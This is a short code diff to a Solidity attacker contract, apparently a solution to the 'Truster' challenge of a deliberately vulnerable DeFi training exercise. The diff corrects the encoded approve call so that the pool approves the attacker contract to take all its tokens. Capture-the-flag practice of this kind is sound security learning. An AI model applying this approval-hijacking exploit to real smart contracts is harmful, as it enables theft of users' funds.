@@ -8,8 +8,8 @@ contract TrusterAttacker {
 
     function attack(address _pool, address _token, address _recovery) external {
         bytes memory data = abi.encodeWithSelector(
-            DamnValuableToken(_token).approve,
-            _recovery,
+            DamnValuableToken(_token).approve.selector,
+            address(this),
             TOKENS_IN_POOL
         );
 
